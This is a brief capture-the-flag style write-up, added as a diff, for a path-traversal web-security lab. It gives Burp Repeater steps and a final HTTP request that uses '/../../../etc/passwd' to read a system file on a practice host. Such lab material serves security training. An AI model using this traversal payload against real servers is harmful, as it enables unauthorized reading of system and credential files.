@@ -1,0 +1,17 @@
+File path traversal, simple case
+
+Click on a blog then open the image in a new tab. Send that corresponding request to Repeater in Burp.
+Now try changing the filename with /etc/passwd. You'll get an error. Start iterating by adding /.. in front. After 3 of them you'll get the contents of /etc/passwd.
+Do it in repeater as in a browser the image will error out.
+
+Final request:
+GET /image?filename=/../../../etc/passwd HTTP/1.1
+Host: aca21fa41ef136ba80ee1fa4000900ac.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: session=DgJBXAWtSvPbtPq5EbjpGFYHwhyx1o0W
+Upgrade-Insecure-Requests: 1
+
